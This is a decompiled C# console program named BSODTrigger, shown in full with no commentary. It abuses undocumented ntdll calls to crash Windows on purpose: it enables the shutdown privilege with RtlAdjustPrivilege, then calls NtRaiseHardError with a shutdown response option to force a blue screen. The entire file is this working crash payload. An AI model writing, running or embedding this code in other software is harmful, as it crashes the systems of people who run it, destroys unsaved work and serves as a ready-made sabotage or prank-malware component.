// Decompiled with JetBrains decompiler
// Type: BSODTrigger.Program
// Assembly: ConsoleApp1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0CA4CCE2-F488-48A7-808E-A1EE567D134A

using System;
using System.Runtime.InteropServices;

#nullable disable
namespace BSODTrigger;

internal class Program
{
  [DllImport("ntdll.dll", SetLastError = true)]
  private static extern uint RtlAdjustPrivilege(
    int privilege,
    bool enable,
    bool currentThread,
    out bool previousValue);

  [DllImport("ntdll.dll", SetLastError = true)]
  private static extern uint NtRaiseHardError(
    uint errorStatus,
    uint numberOfParameters,
    uint unicodeStringParameterMask,
    IntPtr parameters,
    uint responseOption,
    out uint response);

  private static void Main(string[] args)
  {
    Program.RtlAdjustPrivilege(19, true, false, out bool _);
    int num = (int) Program.NtRaiseHardError(3221225506U /*0xC0000022*/, 0U, 0U, IntPtr.Zero, 6U, out uint _);
  }
}
